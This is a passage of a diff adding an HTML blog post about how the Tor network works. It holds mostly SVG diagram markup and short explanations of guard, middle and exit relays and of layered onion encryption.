+          d=&#34;M 174.55775,549.87984 H 59.727153 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 174.55815 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,29.54742 H 68.13109 v -19.60463 h 49.01237 v 19.60463 z m 57.41429,20.51836 H 59.727153 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 174.55815 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.41429,29.04184 H 68.13109 v -19.60502 h 49.01237 v 19.60502 z m 57.41429,20.53889 H 59.727153 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 174.55815 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,30.50664 H 68.13109 v -19.60342 h 49.01237 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 H 97.301342 c -3.374375,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 H 61.945876 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060833,-5.60316 h 12.177216 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-39&#34;
+          d=&#34;M 183.12918,889.87983 H 68.298584 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702521 v -19.60463 h 49.012369 v 19.60463 z m 57.41429,20.51836 H 68.298584 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702521 v -19.60502 h 49.012369 v 19.60502 z m 57.41429,20.53889 H 68.298584 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 V 1027.2 c 0,2.0613 1.668872,3.731 3.732221,3.731 H 183.12958 c 2.06536,0 3.73263,-1.6693 3.73263,-3.731 v -33.93782 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,1020.033 H 76.702521 v -19.6034 h 49.012369 v 19.6034 z m 25.89932,45.9552 h 29.29383 v 5.3483 h -29.24633 v 0.2508 c 0,3.3792 -2.73556,6.1144 -6.11034,6.1144 h -39.6786 c -3.37437,0 -6.112757,-2.7356 -6.112757,-6.1144 v -0.2508 H 70.517307 v -5.3483 h 29.295035 c 0.260838,-3.1365 2.859948,-5.6032 6.060838,-5.6032 h 12.17721 v -12.2199 c 0,-3.3748 2.73516,-6.1148 6.10994,-6.1148 h 3.05598 c 3.37518,0 6.11115,2.7404 6.11115,6.1148 v 12.2199 h 12.22431 c 3.2025,0 5.79758,2.4715 6.06244,5.6032 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-38&#34;
+          d=&#34;m 603.12919,138.45126 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 V 142.1871 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-8&#34;
+          d=&#34;m 603.12919,404.16555 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 V 507.5479 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-2&#34;
+          d=&#34;m 603.12919,675.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          style=&#34;fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+          d=&#34;M -605.71457,586.64818 -339.19506,367.78404&#34;
+          id=&#34;path8901&#34;
+          inkscape:connector-curvature=&#34;0&#34; /&gt;
+       &lt;path
+          style=&#34;fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+          d=&#34;M -232.62393,367.1089 72.821982,1070.2735&#34;
+          id=&#34;path8903&#34;
+          inkscape:connector-curvature=&#34;0&#34; /&gt;
+       &lt;path
+          style=&#34;fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+          d=&#34;M 178.42094,1070.3735 492.84919,315.40803&#34;
+          id=&#34;path8905&#34;
+          inkscape:connector-curvature=&#34;0&#34; /&gt;
+       &lt;path
+          style=&#34;fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+          d=&#34;M 598.64615,315.96501 814.29764,589.51697&#34;
+          id=&#34;path8907&#34;
+          inkscape:connector-curvature=&#34;0&#34; /&gt;
+       &lt;text
+          xml:space=&#34;preserve&#34;
+          style=&#34;font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal&#34;
+          x=&#34;-840.00891&#34;
+          y=&#34;1171.5078&#34;
+          id=&#34;text9491&#34;
+          sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+            sodipodi:role=&#34;line&#34;
+            x=&#34;-840.00891&#34;
+            y=&#34;1171.5078&#34;
+            id=&#34;tspan9493&#34;&gt;&lt;tspan
+              x=&#34;-840.00891&#34;
+              y=&#34;1171.5078&#34;
+              id=&#34;tspan9495&#34;
+              style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;Client&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+       &lt;text
+          xml:space=&#34;preserve&#34;
+          style=&#34;font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal&#34;
+          x=&#34;-411.45981&#34;
+          y=&#34;1177.25&#34;
+          id=&#34;text9497&#34;
+          sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+            sodipodi:role=&#34;line&#34;
+            x=&#34;-411.45981&#34;
+            y=&#34;1177.25&#34;
+            id=&#34;tspan9499&#34;&gt;&lt;tspan
+              x=&#34;-411.45981&#34;
+              y=&#34;1177.25&#34;
+              id=&#34;tspan9501&#34;
+              style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;Guard Relay&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+       &lt;text
+          xml:space=&#34;preserve&#34;
+          style=&#34;font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal&#34;
+          x=&#34;2.2544701&#34;
+          y=&#34;1178.1072&#34;
+          id=&#34;text9503&#34;
+          sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+            sodipodi:role=&#34;line&#34;
+            x=&#34;2.2544701&#34;
+            y=&#34;1178.1072&#34;
+            id=&#34;tspan9505&#34;&gt;&lt;tspan
+              x=&#34;2.2544701&#34;
+              y=&#34;1178.1072&#34;
+              id=&#34;tspan9507&#34;
+              style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;Middle Relay&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+       &lt;text
+          xml:space=&#34;preserve&#34;
+          style=&#34;font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal&#34;
+          x=&#34;462.25449&#34;
+          y=&#34;1183.8215&#34;
+          id=&#34;text9509&#34;
+          sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+            sodipodi:role=&#34;line&#34;
+            x=&#34;462.25449&#34;
+            y=&#34;1183.8215&#34;
+            id=&#34;tspan9511&#34;&gt;&lt;tspan
+              x=&#34;462.25449&#34;
+              y=&#34;1183.8215&#34;
+              id=&#34;tspan9513&#34;
+              style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;Exit Relay&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+       &lt;text
+          xml:space=&#34;preserve&#34;
+          style=&#34;font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal&#34;
+          x=&#34;856.54022&#34;
+          y=&#34;1189.5358&#34;
+          id=&#34;text9515&#34;
+          sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+            sodipodi:role=&#34;line&#34;
+            x=&#34;856.54022&#34;
+            y=&#34;1189.5358&#34;
+            id=&#34;tspan9517&#34;&gt;&lt;tspan
+              x=&#34;856.54022&#34;
+              y=&#34;1189.5358&#34;
+              id=&#34;tspan9519&#34;
+              style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;Desination&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+     &lt;/g&gt;
+   &lt;/svg&gt;
+&lt;/div&gt;
+&lt;br/&gt;
+&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Entry/Guard Relay&lt;/strong&gt; - This is the entry point to the Tor network. Relays are selected to serve as guard relays after being around for a while, as well as having shown to be stable and having high bandwidth.&lt;sup&gt;&lt;a href=&#34;https://blog.torproject.org/blog/lifecycle-of-a-new-relay&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Middle Relay&lt;/strong&gt; - Middle relays are exactly that - middle nodes used to transport traffic from the guard relay to the exit relay. This prevents the guard and exit relay from knowing each other.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Exit Relay&lt;/strong&gt; - These relays are the exit point at the edge of the Tor network. These relays send traffic to the final destination intended by the client.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Generally, it is safe to run a guard or middle relay on any VPS or shared server (such as  &lt;a href=&#34;https://www.digitalocean.com/?refcode=2895d5b6c219&#34;&gt;DigitalOcean&lt;/a&gt; or &lt;a href=&#34;https://aws.amazon.com/ec2/&#34;&gt;EC2&lt;/a&gt;), since all the server operators will see is harmless encrypted traffic (more on this later).&lt;/p&gt;
+
+&lt;p&gt;However, there are &lt;a href=&#34;https://blog.torproject.org/blog/tips-running-exit-node-minimal-harassment&#34;&gt;special responsibilities&lt;/a&gt; to consider when running an exit node. Since exit relays send traffic directly to the end destination, any illicit activity done through Tor appears to come from the exit relay. This leads to the rare possibility of raids, abuse notices, or more.&lt;/p&gt;
+
+&lt;p&gt;If you meet an exit relay operator - thank them. &lt;strong&gt;They deserve it.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;why-onions:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Why Onions?&lt;/h3&gt;
+
+&lt;p&gt;Now that we know how connections are routed through relays, how do we know we can actually &lt;em&gt;trust&lt;/em&gt; relays? How can we be sure relays won&amp;rsquo;t track who we&amp;rsquo;re connecting to and sniff the data we send across the wire? The short answer is, &lt;em&gt;we don&amp;rsquo;t have to!&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Tor is designed to put as little trust in relays as possible. It does this through the use of &lt;strong&gt;encryption&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;So what&amp;rsquo;s the deal with all the references to onions? To answer this question, let&amp;rsquo;s take a high-level look at how the encryption works when a client makes a connection through the Tor network.&lt;/p&gt;
+
+&lt;p&gt;&lt;span class=&#34;fa-stack fa-lg fa-1x&#34;&gt;
+&lt;i class=&#34;fa fa-circle fa-stack-2x&#34; style=&#34;color:#3498DB&#34;&gt;&lt;/i&gt;
+&lt;i class=&#34;fa fa-stack-1x&#34; style=&#34;color:white; font-family:inherit;&#34;&gt;1&lt;/i&gt;
+&lt;/span&gt;
+The client encrypts the original data in such a way that only the exit relay can decrypt it.&lt;/p&gt;
+
+&lt;p&gt;&lt;span class=&#34;fa-stack fa-lg fa-1x&#34;&gt;
+&lt;i class=&#34;fa fa-circle fa-stack-2x&#34; style=&#34;color:#3498DB&#34;&gt;&lt;/i&gt;
+&lt;i class=&#34;fa fa-stack-1x&#34; style=&#34;color:white; font-family:inherit;&#34;&gt;2&lt;/i&gt;
+&lt;/span&gt;
+This encrypted data is then encrypted again in such a way that only the middle relay can decrypt it.&lt;/p&gt;
+
+&lt;p&gt;&lt;span class=&#34;fa-stack fa-lg fa-1x&#34;&gt;
+&lt;i class=&#34;fa fa-circle fa-stack-2x&#34; style=&#34;color:#3498DB&#34;&gt;&lt;/i&gt;
+&lt;i class=&#34;fa fa-stack-1x&#34; style=&#34;color:white; font-family:inherit;&#34;&gt;3&lt;/i&gt;
+&lt;/span&gt;
+Finally, this encrypted data is encrypted once more in such a way that only the guard relay can decrypt it.&lt;/p&gt;
+
+&lt;p&gt;&lt;div style=&#34;padding:10px;background:#3498DB;border-radius:5px;&#34;&gt;
+&lt;svg
+   xmlns:dc=&#34;http://purl.org/dc/elements/1.1/&#34;
+   xmlns:cc=&#34;http://creativecommons.org/ns#&#34;
+   xmlns:rdf=&#34;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#34;
+   xmlns:svg=&#34;http://www.w3.org/2000/svg&#34;
+   xmlns=&#34;http://www.w3.org/2000/svg&#34;
+   id=&#34;encryption&#34;
+   width=&#34;100%&#34;
+   height=&#34;191&#34;
+   viewBox=&#34;0 0 577 192&#34;
+   style=&#34;max-height:190px&#34;
+   onclick=&#34;s.reset().play();&#34;
+   version=&#34;1.0&#34;&gt;
+   &lt;style
+      id=&#34;style3946&#34;&gt;
+ 	.style0{
+ 		fill:	none;
+ 		stroke:	#000000;
+ 		stroke-width:	3;
+ 		stroke-linejoin:	round;
+ 	}
+ 	.style1{
+ 		fill:	none;
+ 		stroke:	#000000;
+ 		stroke-width:	3;
+ 	}
+ 	.style2{
+ 		font-size:	11.9px;
+ 		line-height:	125%;
+ 		letter-spacing:	0px;
+ 		word-spacing:	0px;
+ 		fill:	#000000;
+ 		font-family:	Sans;
+ 	}
+ 	.style3{
+ 		font-size:	11.9px;
+ 	}
+ &lt;/style&gt;
+   &lt;metadata
+      id=&#34;metadata1928&#34;&gt;
+     &lt;rdf:RDF&gt;
+       &lt;cc:Work
+          rdf:about=&#34;&#34;&gt;
+         &lt;dc:format&gt;image/svg+xml&lt;/dc:format&gt;
+         &lt;dc:type
+            rdf:resource=&#34;http://purl.org/dc/dcmitype/StillImage&#34; /&gt;
+         &lt;dc:title&gt;&lt;/dc:title&gt;
+       &lt;/cc:Work&gt;
+     &lt;/rdf:RDF&gt;
+   &lt;/metadata&gt;
+   &lt;defs
+      id=&#34;defs1926&#34; /&gt;
+   &lt;path
+      id=&#34;path1934&#34;
+      d=&#34;m 354.4,37.8 c 12.5,0 22.9,34.2 22.9,75.7 0,41.6 -10.2,76.4 -22.7,76.4 -12.5,0 -22.7,-34.9 -22.7,-76.4 0,-41.5 9.9,-75.7 22.5,-75.7 z m 0,0 197,-0.3 c 11,0 24.3,34 24.3,75.8 0,41.9 -13,76.7 -24,76.7 l -197.2,-0.1&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      class=&#34;style0&#34;
+      style=&#34;fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;fill-opacity:1;stroke-opacity:1&#34; /&gt;
+   &lt;path
+      id=&#34;path1934-1&#34;
+      d=&#34;m 292.9,56.4 c 4.6,0 8.5,25.5 8.5,56.7 0,31.1 -3.7,57.2 -8.4,57.2 -4.6,0 -8.4,-26.0 -8.4,-57.2 0,-31.1 3.7,-56.7 8.4,-56.7 z m 0,0 73.6,-0.2 c 4.1,0 9.1,25.4 9.1,56.8 0,31.3 -4.8,57.4 -8.9,57.4 l -73.6,-0.1&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      class=&#34;style0&#34;
+      style=&#34;fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;fill-opacity:1;stroke-opacity:1&#34; /&gt;
+   &lt;path
+      id=&#34;path1934-1-7&#34;
+      d=&#34;m 254.9,82.9 c 2.6,0 4.9,14.9 4.9,33.3 0,18.2 -2.1,33.6 -4.8,33.6 -2.6,0 -4.8,-15.2 -4.8,-33.6 0,-18.2 2.1,-33.3 4.8,-33.3 z m 0,0 42.3,-0.1 c 2.3,0 5.2,14.9 5.2,33.3 0,18.4 -2.7,33.7 -5.1,33.7 l -42.3,0&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      class=&#34;style0&#34;
+      style=&#34;fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1;fill-opacity:1&#34; /&gt;
+   &lt;path
+      id=&#34;path1934-1-4&#34;
+      d=&#34;m 228.2,97.7 c 1.8,0 3.4,9.2 3.4,20.5 0,11.3 -1.5,20.7 -3.3,20.7 -1.8,0 -3.3,-9.4 -3.3,-20.7 0,-11.3 1.4,-20.5 3.3,-20.5 z m 0,0 29.4,-0.1 c 1.6,0 3.6,9.2 3.6,20.5 0,11.4 -1.9,20.7 -3.5,20.7 l -29.4,0&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      class=&#34;style0&#34;
+      style=&#34;fill:#ffffff;stroke:#4183d7;stroke-width:2.2;stroke-linejoin:round;stroke-opacity:1;fill-opacity:1&#34; /&gt;
+   &lt;text
+      xml:space=&#34;preserve&#34;
+      x=&#34;-4.7&#34;
+      y=&#34;10.2&#34;
+      id=&#34;text4004&#34;
+      style=&#34;font-size:14.0px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;&lt;tspan
+        sodipodi:role=&#34;line&#34;
+        x=&#34;-4.7&#34;
+        y=&#34;10.2&#34;
+        id=&#34;tspan4006&#34;
+        style=&#34;font-size:12px;fill:#ffffff&#34;&gt;&lt;tspan
+          x=&#34;-4.7&#34;
+          y=&#34;10.2&#34;
+          id=&#34;tspan4008&#34;
+          style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff&#34;&gt;Guard Relay Encryption&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+   &lt;text
+      xml:space=&#34;preserve&#34;
+      x=&#34;-5.8&#34;
+      y=&#34;32.1&#34;
+      id=&#34;text3998&#34;
+      style=&#34;font-size:14.1px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff&#34;&gt;&lt;tspan
+        sodipodi:role=&#34;line&#34;
+        x=&#34;-5.8&#34;
+        y=&#34;32.1&#34;
+        id=&#34;tspan4000&#34;
+        style=&#34;font-size:12px;fill:#ffffff&#34;&gt;&lt;tspan
+          x=&#34;-5.8&#34;
+          y=&#34;32.1&#34;
+          id=&#34;tspan4002&#34;
+          style=&#34;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff&#34;&gt;Middle Relay Encryption&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+   &lt;text
+      xml:space=&#34;preserve&#34;
+      x=&#34;-5.1&#34;
+      y=&#34;52.7&#34;
+      id=&#34;text3992&#34;
+      style=&#34;font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff&#34;&gt;&lt;tspan
+        sodipodi:role=&#34;line&#34;
+        x=&#34;-5.1&#34;
+        y=&#34;52.7&#34;
+        id=&#34;tspan3994&#34;
+        style=&#34;font-size:12px;fill:#ffffff&#34;&gt;&lt;tspan
+          x=&#34;-5.1&#34;
+          y=&#34;52.7&#34;
+          id=&#34;tspan3996&#34;
+          style=&#34;font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff&#34;&gt;Exit Relay Encryption&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 548.4,36.3 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 533.9,37.6 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-2&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 517.8,37.7 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-8-4&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 503.3,36.7 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-5&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 487.1,36.8 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-8-2&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
